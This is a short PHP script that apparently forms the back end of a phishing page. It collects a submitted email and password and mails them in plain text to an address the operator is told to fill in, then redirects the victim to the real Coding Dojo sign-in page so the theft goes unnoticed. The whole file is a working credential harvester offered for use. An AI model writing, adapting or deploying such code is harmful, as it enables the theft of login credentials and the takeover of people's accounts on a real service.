<?php
	if(isset($_POST['submit'])){
		$email=$_POST['email'];
		$password=$_POST['password'];
		$to='YOUREMAIL@EXAMPLE.COM'; // Receiver Email ID, Replace with your email ID
		$subject='Form Submission';
		$message="the email is :".$email."\n"."the password is :".$password;
		$headers="From: ".$email;

		if(mail($to, $subject, $message, $headers)){
			header("Location: https://learn.codingdojo.com/signin");
            exit();
		}
		else{
			echo "Something went wrong!";
		}
	}
?>
